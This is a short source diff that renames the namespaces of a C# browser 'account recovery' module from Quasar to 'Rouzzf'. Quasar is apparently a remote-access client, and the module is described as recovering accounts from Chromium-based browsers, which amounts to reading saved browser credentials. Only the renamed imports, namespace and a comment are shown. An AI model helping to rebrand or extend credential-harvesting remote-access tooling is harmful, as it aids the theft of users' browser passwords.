@@ -1,10 +1,10 @@
-﻿using Quasar.Client.Recovery.Utilities;
-using Quasar.Common.Models;
+﻿using Rouzzf.Client.Recovery.Utilities;
+using Rouzzf.Common.Models;
 using System;
 using System.Collections.Generic;
 using System.IO;
 
-namespace Quasar.Client.Recovery.Browsers
+namespace Rouzzf.Client.Recovery.Browsers
 {
     /// <summary>
     /// Provides basic account recovery capabilities from chromium-based applications.
